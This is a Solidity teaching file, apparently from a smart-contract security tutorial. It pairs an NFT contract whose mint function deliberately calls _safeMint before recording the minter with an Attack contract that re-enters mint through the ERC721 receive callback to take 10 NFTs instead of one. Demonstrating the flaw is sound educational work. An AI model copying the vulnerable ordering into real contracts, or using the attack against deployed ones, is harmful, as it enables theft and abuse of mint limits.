// SPDX-License-Identifier: MIT
// By 0xAA
// English translation by 22X
pragma solidity ^0.8.21;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// NFT contract with Reentrancy Vulnerability
contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;
    // Constructor to initialize the name and symbol of the NFT collection
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // Mint function, each user can only mint 1 NFT
    // Contains a reentrancy vulnerability
    function mint() payable external {
        // Check if already minted
        require(mintedAddress[msg.sender] == false);
        // Increase total supply
        totalSupply++;
        // Mint the NFT
        _safeMint(msg.sender, totalSupply);
        // Record the minted address
        mintedAddress[msg.sender] = true;
    }
}

contract Attack is IERC721Receiver {
    NFTReentrancy public nft; // Address of the NFT contract

    // Initialize the NFT contract address
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }
    
    // Attack function to initiate the attack
    function attack() external {
        nft.mint();
    }

    // Callback function for ERC721, repeatedly calls the mint function to mint 10 NFTs
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
